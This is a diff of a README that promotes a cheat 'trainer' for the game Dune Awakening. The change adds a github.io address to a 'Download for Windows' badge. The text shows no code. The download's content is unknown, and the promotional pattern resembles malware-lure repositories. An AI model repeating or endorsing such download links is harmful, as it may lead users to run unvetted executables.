@@ -4,7 +4,7 @@
 
 In a world where spice is life and death comes fast, the **Dune Awakening trainer** gives players powerful tools to outlast rivals, storms, and sandworms. Unlike aimbots or wallhacks, trainers focus on **survival boosts, infinite resources, and god mode toggles**, making them the ultimate utility for explorers and solo players.
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-purple?logo=windows\&style=for-the-badge)]()
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-purple?logo=windows\&style=for-the-badge)](https://dune-awakening-trainer.github.io/.github/)
 
 ---
 
